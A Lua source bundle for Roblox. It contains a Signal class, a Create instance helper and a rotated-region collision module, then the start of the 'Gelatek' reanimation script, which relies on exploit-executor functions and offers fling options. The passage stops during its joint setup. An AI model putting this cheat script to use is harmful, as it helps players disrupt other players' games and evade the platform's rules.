Method :disconnect()
	Arguments:   None
	Returns:     None
	Description: Disconnects all of the functions connected to this signal.

Method :fire( ... )
	Arguments:   Any arguments are accepted
	Returns:     None
	Description: Calls all of the currently connected functions with the given arguments.

Method :wait()
	Arguments:   None
	Returns:     The arguments given to fire
	Description: This call blocks until 
]]

function t.CreateSignal()
	local this = {}

	local mBindableEvent = Instance.new('BindableEvent')
	local mAllCns = {} --all connection objects returned by mBindableEvent::connect

	--main functions
	function this:connect(func)
		if self ~= this then error("connect must be called with `:`, not `.`", 2) end
		if type(func) ~= 'function' then
			error("Argument #1 of connect must be a function, got a "..type(func), 2)
		end
		local cn = mBindableEvent.Event:Connect(func)
		mAllCns[cn] = true
		local pubCn = {}
		function pubCn:disconnect()
			cn:Disconnect()
			mAllCns[cn] = nil
		end
		pubCn.Disconnect = pubCn.disconnect
		
		return pubCn
	end
	
	function this:disconnect()
		if self ~= this then error("disconnect must be called with `:`, not `.`", 2) end
		for cn, _ in pairs(mAllCns) do
			cn:Disconnect()
			mAllCns[cn] = nil
		end
	end
	
	function this:wait()
		if self ~= this then error("wait must be called with `:`, not `.`", 2) end
		return mBindableEvent.Event:Wait()
	end
	
	function this:fire(...)
		if self ~= this then error("fire must be called with `:`, not `.`", 2) end
		mBindableEvent:Fire(...)
	end
	
	this.Connect = this.connect
	this.Disconnect = this.disconnect
	this.Wait = this.wait
	this.Fire = this.fire

	return this
end

------------------------------------------------- Sigal class End ------------------------------------------------------




------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------Create Function Begins---------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
--[[
A "Create" function for easy creation of Roblox instances. The function accepts a string which is the classname of
the object to be created. The function then returns another function which either accepts accepts no arguments, in 
which case it simply creates an object of the given type, or a table argument that may contain several types of data, 
in which case it mutates the object in varying ways depending on the nature of the aggregate data. These are the
type of data and what operation each will perform:
1) A string key mapping to some value:
      Key-Value pairs in this form will be treated as properties of the object, and will be assigned in NO PARTICULAR
      ORDER. If the order in which properties is assigned matter, then they must be assigned somewhere else than the
      |Create| call's body.

2) An integral key mapping to another Instance:
      Normal numeric keys mapping to Instances will be treated as children if the object being created, and will be
      parented to it. This allows nice recursive calls to Create to create a whole hierarchy of objects without a
      need for temporary variables to store references to those objects.

3) A key which is a value returned from Create.Event( eventname ), and a value which is a function function
      The Create.E( string ) function provides a limited way to connect to signals inside of a Create hierarchy 
      for those who really want such a functionality. The name of the event whose name is passed to 
      Create.E( string )

4) A key which is the Create function itself, and a value which is a function
      The function will be run with the argument of the object itself after all other initialization of the object is 
      done by create. This provides a way to do arbitrary things involving the object from withing the create 
      hierarchy. 
      Note: This function is called SYNCHRONOUSLY, that means that you should only so initialization in
      it, not stuff which requires waiting, as the Create call will block until it returns. While waiting in the 
      constructor callback function is possible, it is probably not a good design choice.
      Note: Since the constructor function is called after all other initialization, a Create block cannot have two 
      constructor functions, as it would not be possible to call both of them last, also, this would be unnecessary.


Some example usages:

A simple example which uses the Create function to create a model object and assign two of it's properties.
local model = Create'Model'{
    Name = 'A New model',
    Parent = game.Workspace,
}


An example where a larger hierarchy of object is made. After the call the hierarchy will look like this:
Model_Container
 |-ObjectValue
 |  |
 |  `-BoolValueChild
 `-IntValue

local model = Create'Model'{
    Name = 'Model_Container',
    Create'ObjectValue'{
Create'BoolValue'{
    Name = 'BoolValueChild',
},
    },
    Create'IntValue'{},
}


An example using the event syntax:

local part = Create'Part'{
    [Create.E'Touched'] = function(part)
print("I was touched by "..part.Name)
    end,	
}


An example using the general constructor syntax:

local model = Create'Part'{
    [Create] = function(this)
print("Constructor running!")
this.Name = GetGlobalFoosAndBars(this)
    end,
}


Note: It is also perfectly legal to save a reference to the function returned by a call Create, this will not cause
      any unexpected behavior. EG:
      local partCreatingFunction = Create'Part'
      local part = partCreatingFunction()
]]

--the Create function need to be created as a functor, not a function, in order to support the Create.E syntax, so it
--will be created in several steps rather than as a single function declaration.
local function Create_PrivImpl(objectType)
	if type(objectType) ~= 'string' then
		error("Argument of Create must be a string", 2)
	end
	--return the proxy function that gives us the nice Create'string'{data} syntax
	--The first function call is a function call using Lua's single-string-argument syntax
	--The second function call is using Lua's single-table-argument syntax
	--Both can be chained together for the nice effect.
	return function(dat)
		--default to nothing, to handle the no argument given case
		dat = dat or {}

		--make the object to mutate
		local obj = Instance.new(objectType)
		local parent = nil

		--stored constructor function to be called after other initialization
		local ctor = nil

		for k, v in pairs(dat) do
			--add property
			if type(k) == 'string' then
				if k == 'Parent' then
					-- Parent should always be set last, setting the Parent of a new object
					-- immediately makes performance worse for all subsequent property updates.
					parent = v
				else
					obj[k] = v
				end


			--add child
			elseif type(k) == 'number' then
				if type(v) ~= 'userdata' then
					error("Bad entry in Create body: Numeric keys must be paired with children, got a: "..type(v), 2)
				end
				v.Parent = obj


			--event connect
			elseif type(k) == 'table' and k.__eventname then
				if type(v) ~= 'function' then
					error("Bad entry in Create body: Key `[Create.E\'"..k.__eventname.."\']` must have a function value\
					       got: "..tostring(v), 2)
				end
				obj[k.__eventname]:connect(v)


			--define constructor function
			elseif k == t.Create then
				if type(v) ~= 'function' then
					error("Bad entry in Create body: Key `[Create]` should be paired with a constructor function, \
					       got: "..tostring(v), 2)
				elseif ctor then
					--ctor already exists, only one allowed
					error("Bad entry in Create body: Only one constructor function is allowed", 2)
				end
				ctor = v


			else
				error("Bad entry ("..tostring(k).." => "..tostring(v)..") in Create body", 2)
			end
		end

		--apply constructor function if it exists
		if ctor then
			ctor(obj)
		end
		
		if parent then
			obj.Parent = parent
		end

		--return the completed object
		return obj
	end
end

--now, create the functor:
t.Create = setmetatable({}, {__call = function(tb, ...) return Create_PrivImpl(...) end})

--and create the "Event.E" syntax stub. Really it's just a stub to construct a table which our Create
--function can recognize as special.
t.Create.E = function(eventName)
	return {__eventname = eventName}
end

-------------------------------------------------Create function End----------------------------------------------------




------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------Documentation Begin-----------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------

t.Help = 
	function(funcNameOrFunc) 
		--input argument can be a string or a function.  Should return a description (of arguments and expected side effects)
		if funcNameOrFunc == "DecodeJSON" or funcNameOrFunc == t.DecodeJSON then
			return "Function DecodeJSON.  " ..
			       "Arguments: (string).  " .. 
			       "Side effect: returns a table with all parsed JSON values" 
		end
		if funcNameOrFunc == "EncodeJSON" or funcNameOrFunc == t.EncodeJSON then
			return "Function EncodeJSON.  " ..
			       "Arguments: (table).  " .. 
			       "Side effect: returns a string composed of argument table in JSON data format" 
		end  
		if funcNameOrFunc == "MakeWedge" or funcNameOrFunc == t.MakeWedge then
			return "Function MakeWedge. " ..
			       "Arguments: (x, y, z, [default material]). " ..
			       "Description: Makes a wedge at location x, y, z. Sets cell x, y, z to default material if "..
			       "parameter is provided, if not sets cell x, y, z to be whatever material it previously was. "..
			       "Returns true if made a wedge, false if the cell remains a block "
		end
		if funcNameOrFunc == "SelectTerrainRegion" or funcNameOrFunc == t.SelectTerrainRegion then
			return "Function SelectTerrainRegion. " ..
			       "Arguments: (regionToSelect, color, selectEmptyCells, selectionParent). " ..
			       "Description: Selects all terrain via a series of selection boxes within the regionToSelect " ..
			       "(this should be a region3 value). The selection box color is detemined by the color argument " ..
			       "(should be a brickcolor value). SelectionParent is the parent that the selection model gets placed to (optional)." ..
			       "SelectEmptyCells is bool, when true will select all cells in the " ..
			       "region, otherwise we only select non-empty cells. Returns a function that can update the selection," ..
			       "arguments to said function are a new region3 to select, and the adornment color (color arg is optional). " ..
			       "Also returns a second function that takes no arguments and destroys the selection"
		end
		if funcNameOrFunc == "CreateSignal" or funcNameOrFunc == t.CreateSignal then
			return "Function CreateSignal. "..
			       "Arguments: None. "..
			       "Returns: The newly created Signal object. This object is identical to the RBXScriptSignal class "..
			       "used for events in Objects, but is a Lua-side object so it can be used to create custom events in"..
			       "Lua code. "..
			       "Methods of the Signal object: :connect, :wait, :fire, :disconnect. "..
			       "For more info you can pass the method name to the Help function, or view the wiki page "..
			       "for this library. EG: Help('Signal:connect')."
		end
		if funcNameOrFunc == "Signal:connect" then
			return "Method Signal:connect. "..
			       "Arguments: (function handler). "..
			       "Return: A connection object which can be used to disconnect the connection to this handler. "..
			       "Description: Connectes a handler function to this Signal, so that when |fire| is called the "..
			       "handler function will be called with the arguments passed to |fire|."
		end
		if funcNameOrFunc == "Signal:wait" then
			return "Method Signal:wait. "..
			       "Arguments: None. "..
			       "Returns: The arguments passed to the next call to |fire|. "..
			       "Description: This call does not return until the next call to |fire| is made, at which point it "..
			       "will return the values which were passed as arguments to that |fire| call."
		end
		if funcNameOrFunc == "Signal:fire" then
			return "Method Signal:fire. "..
			       "Arguments: Any number of arguments of any type. "..
			       "Returns: None. "..
			       "Description: This call will invoke any connected handler functions, and notify any waiting code "..
			       "attached to this Signal to continue, with the arguments passed to this function. Note: The calls "..
			       "to handlers are made asynchronously, so this call will return immediately regardless of how long "..
			       "it takes the connected handler functions to complete."
		end
		if funcNameOrFunc == "Signal:disconnect" then
			return "Method Signal:disconnect. "..
			       "Arguments: None. "..
			       "Returns: None. "..
			       "Description: This call disconnects all handlers attacched to this function, note however, it "..
			       "does NOT make waiting code continue, as is the behavior of normal Roblox events. This method "..
			       "can also be called on the connection object which is returned from Signal:connect to only "..
			       "disconnect a single handler, as opposed to this method, which will disconnect all handlers."
		end
		if funcNameOrFunc == "Create" then
			return "Function Create. "..
			       "Arguments: A table containing information about how to construct a collection of objects. "..
			       "Returns: The constructed objects. "..
			       "Descrition: Create is a very powerfull function, whose description is too long to fit here, and "..
			       "is best described via example, please see the wiki page for a description of how to use it."
		end
	end
	
--------------------------------------------Documentation Ends----------------------------------------------------------






--// RR3
--[[

This is a Rotated Region3 Class that behaves much the same as the standard Region3 class expect that it allows
for both rotated regions and also a varying array of shapes.	

API:

Constructors:
	RotatedRegion3.new(CFrame cframe, Vector3 size)
		> Creates a region from a cframe which acts as the center of the region and size which extends to 
		> the corners like a block part.
	RotatedRegion3.Block(CFrame cframe, Vector3 size)
		> This is the exact same as the region.new constructor, but has a different name.
	RotatedRegion3.Wedge(CFrame cframe, Vector3 size)
		> Creates a region from a cframe which acts as the center of the region and size which extends to 
		> the corners like a wedge part.
	RotatedRegion3.CornerWedge(CFrame cframe, Vector3 size)
		> Creates a region from a cframe which acts as the center of the region and size which extends to 
		> the corners like a cornerWedge part.
	RotatedRegion3.Cylinder(CFrame cframe, Vector3 size)
		> Creates a region from a cframe which acts as the center of the region and size which extends to 
		> the corners like a cylinder part.
	RotatedRegion3.Ball(CFrame cframe, Vector3 size)
		> Creates a region from a cframe which acts as the center of the region and size which extends to 
		> the corners like a ball part.
	RotatedRegion3.FromPart(part)
		> Creates a region from a part in the game. It can be used on any base part, but the region 
		> will treat unknown shapes (meshes, unions, etc) as block shapes.

Methods:
	RotatedRegion3:CastPoint(Vector3 point)
		> returns true or false if the point is within the RotatedRegion3 object
	RotatedRegion3:CastPart(BasePart part)
		> returns true or false if the part is withing the RotatedRegion3 object
	RotatedRegion3:FindPartsInRegion3(Instance ignore, Integer maxParts)
		> returns array of parts in the RotatedRegion3 object
		> will return a maximum number of parts in array [maxParts] the default is 20
		> parts that either are descendants of or actually are the [ignore] instance will be ignored
	RotatedRegion3:FindPartsInRegion3WithIgnoreList(Instance Array ignore, Integer maxParts)
		> returns array of parts in the RotatedRegion3 object
		> will return a maximum number of parts in array [maxParts] the default is 20
		> parts that either are descendants of the [ignore array] or actually are the [ignore array] instances will be ignored
	RotatedRegion3:FindPartsInRegion3WithWhiteList(Instance Array whiteList, Integer maxParts)
		> returns array of parts in the RotatedRegion3 object
		> will return a maximum number of parts in array [maxParts] the default is 20
		> parts that either are descendants of the [whiteList array] or actually are the [whiteList array] instances are all that will be checked
	RotatedRegion3:Cast(Instance or Instance Array ignore, Integer maxParts)
		> Same as the `:FindPartsInRegion3WithIgnoreList` method, but will check if the ignore argument is an array or single instance

Properties:
	RotatedRegion3.CFrame
		> cframe that represents the center of the region
	RotatedRegion3.Size
		> vector3 that represents the size of the region
	RotatedRegion3.Shape
		> string that represents the shape type of the RotatedRegion3 object
	RotatedRegion3.Set
		> array of vector3 that are passed to the support function
	RotatedRegion3.Support
		> function that is used for support in the GJK algorithm
	RotatedRegion3.Centroid
		> vector3 that represents the center of the set, again used for the GJK algorithm
	RotatedRegion3.AlignedRegion3
		> standard region3 that represents the world bounding box of the RotatedRegion3 object

Note: I haven't actually done anything to enforce this, but you should treat all these properties as read only

Enjoy!
- EgoMoose

--]]

--// GJK
function GJK()
local MAX_TRIES = 20
local ZERO3 = Vector3.new(0, 0, 0)

-- Class

local GJK = {}
GJK.__index = GJK

-- Private Functions

local function tripleProduct(a, b, c)
	return b * c:Dot(a) - a * c:Dot(b)
end

local function containsOrigin(self, simplex, direction)
	local a = simplex[#simplex]
	local ao = -a

	if (#simplex == 4) then
		local b, c, d = simplex[3], simplex[2], simplex[1]
		local ab, ac, ad = b - a, c - a, d - a
		local abc, acd, adb = ab:Cross(ac), ac:Cross(ad), ad:Cross(ab)
		
		abc = abc:Dot(ad) > 0 and -abc or abc
		acd = acd:Dot(ab) > 0 and -acd or acd
		adb = adb:Dot(ac) > 0 and -adb or adb
		
		if (abc:Dot(ao) > 0) then
			table.remove(simplex, 1)
			direction = abc
		elseif (acd:Dot(ao) > 0) then
			table.remove(simplex, 2)
			direction = acd
		elseif (adb:Dot(ao) > 0) then
			table.remove(simplex, 3)
			direction = adb
		else
			return true
		end
	elseif (#simplex == 3) then
		local b, c = simplex[2], simplex[1]
		local ab, ac = b - a, c - a
		
		local abc = ab:Cross(ac)
		local abPerp = tripleProduct(ac, ab, ab).Unit
		local acPerp = tripleProduct(ab, ac, ac).Unit
		
		if (abPerp:Dot(ao) > 0) then
			table.remove(simplex, 1)
			direction = abPerp
		elseif (acPerp:Dot(ao) > 0) then
			table.remove(simplex, 2)
			direction = acPerp
		else
			local isV3 = ((a - a) == ZERO3)
			if (not isV3) then
				return true
			else
				direction = abc:Dot(ao) > 0 and abc or -abc
			end
		end
	else
		local b = simplex[1]
		local ab = b - a
		local bcPerp = tripleProduct(ab, ao, ab).Unit
		direction = bcPerp
	end
	
	return false, direction
end

-- Public Constructors

function GJK.new(SetA, SetB, CentroidA, CentroidB, SupportA, SupportB)
	local self = setmetatable({}, GJK)
	
	self.SetA = SetA
	self.SetB = SetB
	self.CentroidA = CentroidA
	self.CentroidB = CentroidB
	self.SupportA = SupportA
	self.SupportB = SupportB

	return self
end

-- Public Methods

function GJK:IsColliding()
	local direction = (self.CentroidA - self.CentroidB).Unit
	local simplex = {self.SupportA(self.SetA, direction) - self.SupportB(self.SetB, -direction)}
	
	direction = -direction
	
	for i = 1, MAX_TRIES do
		table.insert(simplex, self.SupportA(self.SetA, direction) - self.SupportB(self.SetB, -direction))
		
		if (simplex[#simplex]:Dot(direction) <= 0) then
			return false
		else
			local passed, newDirection = containsOrigin(self, simplex, direction)
			
			if (passed) then
				return true
			end
			
			direction = newDirection
		end
	end
	
	return false
end
return GJK
end


--// Suports
function Supports()
local ZERO = Vector3.new(0, 0, 0)
local RIGHT = Vector3.new(1, 0, 0)

--

local function rayPlane(p, v, s, n)
	local r = p - s;
	local t = -r:Dot(n) / v:Dot(n)
	return p + t * v, t
end;

--

local Supports = {}

function Supports.PointCloud(set, direction)
	local max, maxDot = set[1], set[1]:Dot(direction)
	for i = 2, #set do
		local dot = set[i]:Dot(direction)
		if (dot > maxDot) then
			max = set[i]
			maxDot = dot
		end
	end
	return max
end

function Supports.Cylinder(set, direction)
	local cf, size2 = unpack(set)
	direction = cf:VectorToObjectSpace(direction)
	local radius = math.min(size2.y, size2.z)
	local dotT, cPoint = direction:Dot(RIGHT), Vector3.new(size2.x, 0, 0)
	local h, t, final
	
	if (dotT == 0) then
		final = direction.Unit * radius
	else
		cPoint = dotT > 0 and cPoint or -cPoint
		h, t = rayPlane(ZERO, direction, cPoint, RIGHT)
		final = cPoint + (h - cPoint).Unit * radius
	end
	
	return cf:PointToWorldSpace(final)
end

function Supports.Ellipsoid(set, direction)
	local cf, size2 = unpack(set)
	return cf:PointToWorldSpace(size2 * (size2 * cf:VectorToObjectSpace(direction)).Unit)
end

return Supports
end

--// Vertices 
-- CONSTANTS
function Vertices()
local PI2 = math.pi*2
local PHI = (1 + math.sqrt(5)) / 2

local RIGHT 	= Vector3.new(1, 0, 0)
local UP 		= Vector3.new(0, 1, 0)
local BACK 		= Vector3.new(0, 0, 1)
local LEFT 		= Vector3.new(-1, 0, 0)
local DOWN 		= Vector3.new(0, -1, 0)
local FORWARD 	= Vector3.new(0, 0, -1)

local CORNERS = {
	Vector3.new(1, 1, 1);
	Vector3.new(-1, 1, 1);
	Vector3.new(-1, 1, -1);
	Vector3.new(1, 1, -1);
	Vector3.new(1, -1, 1);
	Vector3.new(-1, -1, 1);
	Vector3.new(-1, -1, -1);
	Vector3.new(1, -1, -1);
}

-- VERTICE INDEX ARRAYS

local BLOCK = {1, 2, 3, 4, 5, 6, 7, 8}
local WEDGE = {1, 2, 5, 6, 7, 8}
local CORNERWEDGE = {4, 5, 6, 7, 8}

-- VERTICE FUNCTIONS

local function fromIndexArray(array)
	local output = {}
	for i = 1, #array do
		output[i] = CORNERS[array[i]]
	end
	return output
end

local function cylinder(n)
	local output = {}
	local arc = PI2 / n
	for i = 1, n do
		local vi = CFrame.fromAxisAngle(RIGHT, i*arc) * UP
		output[i] = RIGHT + vi
		output[n + i] = LEFT + vi
	end
	return output
end

local function icoSphere(n)
	local verts = {
		Vector3.new(-1,  PHI, 0),
		Vector3.new(1,  PHI, 0),
		Vector3.new(-1, -PHI, 0),
		Vector3.new(1, -PHI, 0),
		
		Vector3.new(0, -1,  PHI),
		Vector3.new(0,  1,  PHI),
		Vector3.new(0, -1, -PHI),
		Vector3.new(0,  1, -PHI),
		
		Vector3.new(PHI, 0, -1),
		Vector3.new(PHI, 0,  1),
		Vector3.new(-PHI, 0, -1),
		Vector3.new(-PHI, 0,  1)
	}
	
	local indices = {
		1, 12, 6,
		1, 6, 2,
		1, 2, 8,
		1, 8, 11,
		1, 11, 12,
		
		2, 6, 10,
		6, 12, 5,
		12, 11, 3,
		11, 8, 7,
		8, 2, 9,
		
		4, 10, 5,
		4, 5, 3,
		4, 3, 7,
		4, 7, 9,
		4, 9, 10,
		
		5, 10, 6,
		3, 5, 12,
		7, 3, 11,
		9, 7, 8,
		10, 9, 2
	}
	
	local splits = {}
	
	local function split(i, j)
		local key = i < j and (i .. "," .. j) or (j .. "," .. i)
		
		if (not splits[key]) then
			verts[#verts+1] = (verts[i] + verts[j]) / 2
			splits[key] = #verts
		end
		
		return splits[key]
	end
	
	for _ = 1, n do
		for  i = #indices, 1, -3 do
			local v1, v2, v3 = indices[i - 2], indices[i - 1], indices[i]
			local a = split(v1, v2)
			local b = split(v2, v3)
			local c = split(v3, v1)
			
			indices[#indices+1] = v1
			indices[#indices+1] = a
			indices[#indices+1] = c
			
			indices[#indices+1] = v2
			indices[#indices+1] = b
			indices[#indices+1] = a
			
			indices[#indices+1] = v3
			indices[#indices+1] = c
			indices[#indices+1] = b
			
			indices[#indices+1] = a
			indices[#indices+1] = b
			indices[#indices+1] = c
			
			table.remove(indices, i)
			table.remove(indices, i - 1)
			table.remove(indices, i - 2)
		end
	end
	
	-- normalize
	for i = 1, #verts do
		verts[i] = verts[i].Unit
	end
	
	return verts
end

-- Useful functions

local function vertShape(cf, size2, array)
	local output = {}
	for i = 1, #array do
		output[i] = cf:PointToWorldSpace(array[i] * size2)
	end
	return output
end

local function getCentroidFromSet(set)
	local sum = set[1]
	for i = 2, #set do
		sum = sum + set[2]
	end
	return sum / #set
end

local function classify(part)
	if (part.ClassName == "Part") then
		if (part.Shape == Enum.PartType.Block) then
			return "Block"
		elseif (part.Shape == Enum.PartType.Cylinder) then
			return "Cylinder"
		elseif (part.Shape == Enum.PartType.Ball) then
			return "Ball"
		end;
	elseif (part.ClassName == "WedgePart") then
		return "Wedge"
	elseif (part.ClassName == "CornerWedgePart") then
		return "CornerWedge"
	elseif (part:IsA("BasePart")) then -- mesh, CSG, truss, etc... just use block
		return "Block"
	end
end

-- 

local BLOCK_ARRAY = fromIndexArray(BLOCK)
local WEDGE_ARRAY = fromIndexArray(WEDGE)
local CORNERWEDGE_ARRAY = fromIndexArray(CORNERWEDGE)
local CYLINDER_ARRAY = cylinder(20)
local SPHERE_ARRAY = icoSphere(2)

local Vertices = {
	Block = function(cf, size2) return vertShape(cf, size2, BLOCK_ARRAY) end;
	Wedge = function(cf, size2) return vertShape(cf, size2, WEDGE_ARRAY) end;
	CornerWedge = function(cf, size2) return vertShape(cf, size2, CORNERWEDGE_ARRAY) end;
	Cylinder = function(cf, size2) return vertShape(cf, size2, CYLINDER_ARRAY) end;
	Ball = function(cf, size2) return vertShape(cf, size2, SPHERE_ARRAY) end;
	
	GetCentroid = getCentroidFromSet;
	Classify = classify;
}
return Vertices
end







function RR3()
local GJK = GJK()
local Supports = Supports()
local Vertices = Vertices()


-- Class

local RotatedRegion3 = {}
RotatedRegion3.__index = RotatedRegion3

-- Private functions

local function getCorners(cf, s2)
	return {
		cf:PointToWorldSpace(Vector3.new(-s2.x, s2.y, s2.z));
		cf:PointToWorldSpace(Vector3.new(-s2.x, -s2.y, s2.z));
		cf:PointToWorldSpace(Vector3.new(-s2.x, -s2.y, -s2.z));
		cf:PointToWorldSpace(Vector3.new(s2.x, -s2.y, -s2.z));
		cf:PointToWorldSpace(Vector3.new(s2.x, s2.y, -s2.z));
		cf:PointToWorldSpace(Vector3.new(s2.x, s2.y, s2.z));
		cf:PointToWorldSpace(Vector3.new(s2.x, -s2.y, s2.z));
		cf:PointToWorldSpace(Vector3.new(-s2.x, s2.y, -s2.z));
	}
end

local function worldBoundingBox(set)
	local x, y, z = {}, {}, {}
	for i = 1, #set do x[i], y[i], z[i] = set[i].x, set[i].y, set[i].z end
	local min = Vector3.new(math.min(unpack(x)), math.min(unpack(y)), math.min(unpack(z)))
	local max = Vector3.new(math.max(unpack(x)), math.max(unpack(y)), math.max(unpack(z)))
	return min, max
end

-- Public Constructors

function RotatedRegion3.new(cframe, size)
	local self = setmetatable({}, RotatedRegion3)
	
	self.CFrame = cframe
	self.Size = size
	self.Shape = "Block"
	
	self.Set = Vertices.Block(cframe, size/2)
	self.Support = Supports.PointCloud
	self.Centroid = cframe.p
	
	self.AlignedRegion3 = Region3.new(worldBoundingBox(self.Set))

	return self
end

RotatedRegion3.Block = RotatedRegion3.new

function RotatedRegion3.Wedge(cframe, size)
	local self = setmetatable({}, RotatedRegion3)

	self.CFrame = cframe
	self.Size = size
	self.Shape = "Wedge"
	
	self.Set = Vertices.Wedge(cframe, size/2)
	self.Support = Supports.PointCloud
	self.Centroid = Vertices.GetCentroid(self.Set)
	
	self.AlignedRegion3 = Region3.new(worldBoundingBox(self.Set))

	return self
end

function RotatedRegion3.CornerWedge(cframe, size)
	local self = setmetatable({}, RotatedRegion3)

	self.CFrame = cframe
	self.Size = size
	self.Shape = "CornerWedge"
	
	self.Set = Vertices.CornerWedge(cframe, size/2)
	self.Support = Supports.PointCloud
	self.Centroid = Vertices.GetCentroid(self.Set)
	
	self.AlignedRegion3 = Region3.new(worldBoundingBox(self.Set))

	return self
end

function RotatedRegion3.Cylinder(cframe, size)
	local self = setmetatable({}, RotatedRegion3)

	self.CFrame = cframe
	self.Size = size
	self.Shape = "Cylinder"
	
	self.Set = {cframe, size/2}
	self.Support = Supports.Cylinder
	self.Centroid = cframe.p
	
	self.AlignedRegion3 = Region3.new(worldBoundingBox(getCorners(unpack(self.Set))))

	return self
end

function RotatedRegion3.Ball(cframe, size)
	local self = setmetatable({}, RotatedRegion3)

	self.CFrame = cframe
	self.Size = size
	self.Shape = "Ball"
	
	self.Set = {cframe, size/2}
	self.Support = Supports.Ellipsoid
	self.Centroid = cframe.p
	
	self.AlignedRegion3 = Region3.new(worldBoundingBox(getCorners(unpack(self.Set))))

	return self
end

function RotatedRegion3.FromPart(part)
	return RotatedRegion3[Vertices.Classify(part)](part.CFrame, part.Size)
end

-- Public Constructors

function RotatedRegion3:CastPoint(point)
	local gjk = GJK.new(self.Set, {point}, self.Centroid, point, self.Support, Supports.PointCloud)
	return gjk:IsColliding()
end

function RotatedRegion3:CastPart(part)
	local r3 = RotatedRegion3.FromPart(part)
	local gjk = GJK.new(self.Set, r3.Set, self.Centroid, r3.Centroid, self.Support, r3.Support)
	return gjk:IsColliding()
end

function RotatedRegion3:FindPartsInRegion3(ignore, maxParts)
	local found = {}
	local parts = game.Workspace:FindPartsInRegion3(self.AlignedRegion3, ignore, maxParts)
	for i = 1, #parts do
		if (self:CastPart(parts[i])) then
			table.insert(found, parts[i])
		end
	end
	return found
end

function RotatedRegion3:FindPartsInRegion3WithIgnoreList(ignore, maxParts)
	ignore = ignore or {}
	local found = {}
	local parts = game.Workspace:FindPartsInRegion3WithIgnoreList(self.AlignedRegion3, ignore, maxParts)
	for i = 1, #parts do
		if (self:CastPart(parts[i])) then
			table.insert(found, parts[i])
		end
	end
	return found
end

function RotatedRegion3:FindPartsInRegion3WithWhiteList(whiteList, maxParts)
	whiteList = whiteList or {}
	local found = {}
	local parts = game.Workspace:FindPartsInRegion3WithWhiteList(self.AlignedRegion3, whiteList, maxParts)
	for i = 1, #parts do
		if (self:CastPart(parts[i])) then
			table.insert(found, parts[i])
		end
	end
	return found
end

function RotatedRegion3:Cast(ignore, maxParts)
	ignore = type(ignore) == "table" and ignore or {ignore}
	return self:FindPartsInRegion3WithIgnoreList(ignore, maxParts)
end

--

return RotatedRegion3
end




function Gelatek()
-- Credits:
--[[
	Gelatek - Everything
	Emper - Optimization Tips
	Syndi/Mizt - Hat Renamer (to be changed with own one later)


]]
local Game=game
local RunService=Game:GetService("RunService")
local StartGui=Game:GetService("StarterGui")
local TestService=Game:GetService("TestService")
local Workspace=Game:GetService("Workspace")
local Players=Game:GetService("Players")
local PreSim=RunService.PreSimulation
local PostSim=RunService.PostSimulation
local CurrentCam=Workspace.CurrentCamera

local Speed=tick()
local Warn=warn
local Error=error

local Wait=task.wait
local Infinite=math.huge
local V3new=Vector3.new
local INew=Instance.new
local CFNew=CFrame.new
local CFAngles=CFrame.Angles
local MathRandom=math.random
local Insert=table.insert
local Clear=table.clear
local Type=type

local Global=(getgenv and getgenv()) or shared
local DisScripts=true
if not Global.GelatekHubConfig then Global.GelatekHubConfig={} end
local PermanentDeath=Global.GelatekHubConfig["Permanent Death"]  or true
local CollideFling=Global.GelatekHubConfig["Torso Fling"]  or true
local BulletEnabled=Global.GelatekHubConfig["Bullet Enabled"] or true
local KeepHairWelds=Global.GelatekHubConfig["Keep Hats On Head"] or true
local HeadlessPerma=Global.GelatekHubConfig["Headless On Perma"] or false
local DisableAnimations=Global.GelatekHubConfig["Disable Anims"] or true
local Collisions=Global.GelatekHubConfig["Enable Collisions"] or true
local AntiVoid=Global.GelatekHubConfig["Anti Void"] or false
if CollideFling and BulletEnabled then CollideFling=false end
if not Global.TableOfEvents then Global.TableOfEvents={} end

local Player=Players.LocalPlayer
local Character=Player.Character
if Character.Name == "GelatekReanimate" then Error("Reanimation Already Working") end
if (not Character:FindFirstChildOfClass("Humanoid")) or Character:FindFirstChildOfClass("Humanoid").Health == 0 then Error("Player Is Dead.") end

local PlayerDied=false
local IGNORETORSOCHECK="Torso"
local Is_NetworkOwner=isnetworkowner or function(Part) return Part.ReceiveAge == 0 end
local HiddenProps=sethiddenproperty or function() end 

local SpawnPoint=Workspace:FindFirstChildOfClass("SpawnLocation",true) and Workspace:FindFirstChildOfClass("SpawnLocation",true) or CFrame.new(0,20,0)

-- [[ Events ]] --
local PostSimEvent
local PreSimEvent
local TorsoFlingEvent
local DeathEvent
local ResetEvent

local BulletInfo=nil
local HatData=nil

local CF0=CFNew(0,0,0)
local Velocity=V3new(0,-26,0)


Global.PartDisconnected=false
local Humanoid=Character:FindFirstChildWhichIsA("Humanoid")
if not Humanoid then return end
local RootPart=Character:FindFirstChild("HumanoidRootPart")
local R15=Humanoid.RigType.Name == "R15" and true or false
local Sin, Cos, Inf, Clamp, Clock=math.sin, math.cos, math.huge, math.clamp, os.clock
local FakeHats=INew("Folder"); do FakeHats.Name="FakeHats"; FakeHats.Parent=TestService end
Character.Archivable=true
Humanoid:ChangeState(16)


for Index, RagdollStuff in pairs(Character:GetDescendants()) do
	if RagdollStuff:IsA("BallSocketConstraint") or RagdollStuff:IsA("HingeConstraint") then
		RagdollStuff:Destroy()
	end
end


-- Mizt's Hat Renamer
local HatsNames={}
for Index, Accessory in pairs(Character:GetDescendants()) do
	if Accessory:IsA("Accessory") then
		if HatsNames[Accessory.Name] then
			if HatsNames[Accessory.Name] == "Unknown" then
				HatsNames[Accessory.Name]={}
			end
			Insert(HatsNames[Accessory.Name], Accessory)
		else
			HatsNames[Accessory.Name]="Unknown"
		end	
	end
end
for Index, Tables in pairs(HatsNames) do
	if Type(Tables) == "table" then
		local Number=1
		for Index2, Names in ipairs(Tables) do
			Names.Name=Names.Name .. Number
			Number=Number + 1
		end		
	end
end
Clear(HatsNames)

local Figure=INew("Model"); do
	local Limbs={}
	local Attachments={}
	function CreateJoint(Name,Part0,Part1,C0,C1)
		local Joint=INew("Motor6D"); Joint.Name=Name
		Joint.Part0=Part0; Joint.Part1=Part1
